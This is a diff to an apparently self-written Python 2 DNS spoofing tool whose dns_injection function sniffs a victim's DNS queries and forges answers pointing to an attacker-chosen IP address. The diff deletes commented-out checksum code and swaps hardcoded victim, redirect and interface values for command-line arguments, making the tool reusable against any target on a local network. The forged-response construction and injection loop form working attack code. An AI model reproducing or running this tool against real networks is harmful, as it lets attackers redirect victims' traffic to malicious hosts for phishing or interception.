@@ -1,3 +1,4 @@
+import argparse
 import struct
 
 from PacketInjector import PacketInjector
@@ -112,12 +113,6 @@ def dns_injection(victim_ip, routto_ip, packet_snf, packet_inj):
 
                 new_resp_packet += hex_len
 
-                # int_str1 = int(dest_port, 16)
-                # int_str2 = int(src_port, 16)
-                # int_str3 = int(hex_len, 16)
-                # int_all = int_str1 + int_str2 + int_str3
-                # print hex(checksum(int_all))[2:6]
-
                 new_resp_packet += '0000'  # user datagram check sum
 
                 ## domain name system part
@@ -136,39 +131,6 @@ def dns_injection(victim_ip, routto_ip, packet_snf, packet_inj):
                 new_resp_packet += 'c00c00010001000000090004'
                 new_resp_packet += routto_ip
 
-                # int_hex_lst = []
-                #
-                # int_hex_lst.append(int(dest_port, 16))
-                # int_hex_lst.append(int(src_port, 16))
-                # int_hex_lst.append(int(hex_len, 16))
-                # int_hex_lst.append(int(packet_snf.tcp_packet_hex[84:88], 16))
-                # int_hex_lst.append(int('8180', 16))
-                # int_hex_lst.append(int('0001', 16))
-                # int_hex_lst.append(int('0001', 16))
-                # int_hex_lst.append(int('0000', 16))
-                # int_hex_lst.append(int('0000', 16))
-                #
-                # for i in range(0, len(packet_snf.tcp_packet_hex[108:len(packet_snf.tcp_packet_hex)])/4):
-                #     int_hex_lst.append(int(packet_snf.tcp_packet_hex[108+i*4: 108+(i+1)*4], 16))
-                #
-                # int_hex_lst.append(int('c00c', 16))
-                # int_hex_lst.append(int('0001', 16))
-                # int_hex_lst.append(int('0001', 16))
-                # int_hex_lst.append(int('0000', 16))
-                # int_hex_lst.append(int('0009', 16))
-                # int_hex_lst.append(int('0004', 16))
-                # int_hex_lst.append(int(local_ip[0:4], 16))
-                # int_hex_lst.append(int(local_ip[4:8], 16))
-                #
-                #
-                # sum_int = 0
-                # for int_hex in int_hex_lst:
-                #     sum_int += int_hex
-                #
-                # sum_int += int_hex_all
-                #
-                # print hex(checksum(sum_int))[2:6]
-
 
                 for i in range(2):
                     try:
@@ -179,10 +141,17 @@ def dns_injection(victim_ip, routto_ip, packet_snf, packet_inj):
                 print 'packet send'
 
 
-victim_ip = '192.168.1.217'
-routto_ip = '192.168.1.231'
-local_ip = '192.168.1.184'
+if __name__ == '__main__':
+    ap = argparse.ArgumentParser()
+    ap.add_argument('-i', nargs=1)
+    ap.add_argument('-v', nargs=1)
+    ap.add_argument('-r', nargs=1)
 
-packet_snf = PacketSniffer('wlp3s0')
-packet_inj = PacketInjector('wlp3s0')
-dns_injection(victim_ip, routto_ip, packet_snf, packet_inj)
+    opts = ap.parse_args()
+    interface = opts.i[0]
+    victim_ip = opts.v[0]
+    routto_ip = opts.r[0]
+
+    packet_snf = PacketSniffer(interface)
+    packet_inj = PacketInjector(interface)
+    dns_injection(victim_ip, routto_ip, packet_snf, packet_inj)
